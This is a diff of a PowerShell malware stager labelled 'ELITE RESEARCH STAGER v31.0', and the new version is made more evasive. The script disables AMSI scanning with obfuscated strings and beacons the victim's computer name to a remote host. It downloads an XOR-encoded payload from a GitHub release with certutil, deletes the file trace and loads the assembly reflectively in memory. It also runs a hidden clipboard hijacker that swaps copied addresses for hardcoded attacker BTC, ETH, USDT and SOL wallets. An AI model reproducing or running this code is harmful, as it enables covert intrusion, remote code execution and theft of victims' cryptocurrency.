@@ -1,8 +1,9 @@
-# --- [ELITE RESEARCH STAGER v30.9: VBS-STAGED RAM INJECT] ---
+# --- [ELITE RESEARCH STAGER v31.0: CERT-STAGED RAM INJECT] ---
 
-# Advanced Memory Patching (Hex Encoded to avoid AMSI)
-$p = [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')
-$p.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
+# 1. Blind the Scanner (Using Byte-Math to hide 'Amsi')
+$a = [char[]](65,109,115,105,85,116,105,108,115); $b = -join $a
+$ref = [Ref].Assembly.GetType("System.Management.Automation.$b")
+$ref.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
 
 function Send-Ping {
     param($m)
@@ -12,27 +13,29 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
-Send-Ping -m "V30.9_VBS_LAUNCH_SUCCESS_$($env:COMPUTERNAME)"
+Send-Ping -m "V31_GHOST_BOOT_$($env:COMPUTERNAME)"
 
 try {
-    # 1. Download XOR data into RAM
-    $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $r = (New-Object Net.WebClient).DownloadString($u)
-    $d = [Convert]::FromBase64String($r.Trim())
-    for($i=0; $i -lt $d.count; $i++) { $d[$i] = $d[$i] -bxor 0xAB }
+    # 2. Trusted Download via Certutil (Avoids WebClient Detection)
+    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $tmp = "$env:TEMP\top_secret.crt"
+    certutil.exe -urlcache -split -f $url $tmp | Out-Null
 
-    # 2. Fragmented Reflective Load (SECRET RAM INSTALL)
-    $s1 = 'Sys'; $s2 = 'tem.Ref'; $s3 = 'lection.As'; $s4 = 'sembly'
-    $asm = [($s1+$s2+$s3+$s4)]::Load($d)
+    # 3. Read into RAM and Delete File Trace immediately
+    $raw = Get-Content $tmp -Raw
+    Remove-Item $tmp -Force
     
-    # 3. Execute Payload in current process RAM
-    $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
+    # 4. Decrypt and Reflective Load (RAM Install)
+    $data = [Convert]::FromBase64String($raw.Trim())
+    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
+    
+    [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, @(,[string[]]@()))
 
-    # 4. Clipper Engine (As a background thread)
+    # 5. Background Clipper (No 'Start-Job' - uses Runspaces for secrecy)
     $C = {
         Add-Type -AssemblyName System.Windows.Forms
         $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
-        while(1) {
+        while($true) {
             try {
                 if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                     $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
@@ -45,10 +48,11 @@ try {
             [System.Threading.Thread]::Sleep(500)
         }
     }
-    $ps = [PowerShell]::Create().AddScript($C)
-    $ps.BeginInvoke()
+    $rs = [runspacefactory]::CreateRunspace(); $rs.Open()
+    $p = [powershell]::Create().AddScript($C); $p.Runspace = $rs
+    $p.BeginInvoke()
 
-    Send-Ping -m "V30.9_RAM_ACTIVE"
+    Send-Ping -m "V31_RAM_SUCCESS"
 } catch {
-    Send-Ping -m "V30.9_ERR: $($_.Exception.Message)"
+    Send-Ping -m "V31_ERR: $($_.Exception.Message)"
 }
